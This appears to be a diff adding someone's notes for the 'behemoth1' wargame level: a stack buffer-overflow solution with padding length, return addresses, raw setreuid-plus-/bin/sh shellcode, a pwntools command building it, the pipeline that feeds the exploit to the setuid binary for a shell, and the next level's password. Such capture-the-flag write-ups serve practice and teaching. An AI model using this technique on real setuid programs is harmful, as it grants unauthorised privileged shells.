@@ -1,0 +1,27 @@
+Use padding 71 to overflow buffer and get return address
+nop is 0x90
+gets 0xffffd355 with ltrace
+gets 0xffffd335 with gdb
+'j1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+0xffff d535
+
+
+Can break in 0xffff d7a5 
+
+Use `sys.stdout.buffer.write` to write the shellcode and e.g. the nop-sleigh to
+get pure bytes out. Create short files for e.g. the padding, the return
+address, the nop sleigh and the shellcode and then join it together:
+
+cat pad addr nop1k sc > expl
+
+python3 -c "import sys;import pwn;sys.stdout.buffer.write(pwn.asm(pwn.shellcraft.setreuid()+pwn.shellcraft.sh()))" > sc
+
+Pipe in the exploit followed by `cat` to get an interactive shell. Otherwise it exits directly.
+(cat expl; cat) | /behemoth/behemoth1
+
+Password for level2: IxPJbQtH8q
+
+Working folder
+/tmp/tmp.0oYyQqie1C
